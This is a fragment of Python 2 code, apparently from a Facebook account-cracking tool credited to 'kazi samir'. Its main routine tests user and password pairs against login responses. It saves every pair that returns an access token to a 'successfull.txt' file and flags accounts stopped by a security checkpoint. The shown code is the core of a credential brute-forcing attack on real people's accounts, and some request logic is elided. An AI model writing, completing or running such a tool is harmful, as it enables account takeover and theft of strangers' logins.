...
def menu():
    ...
    print '\x1b[1;93mAUTHOR   : \x1b[1;92mkazi samir'                                           
    print '\x1b[1;93mFACEBOOK : \x1b[1;92mFOURKAN UDDIN TANVIR'
    print '\x1b[1;93mGITHUB   : \x1b[1;92mkazi samir'
    print ''
    print '\x1b[1;97m============================================'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[samir-OK]\x1b[0m ' + k + c + user + ' | ' + pass1  +  '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[samir-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
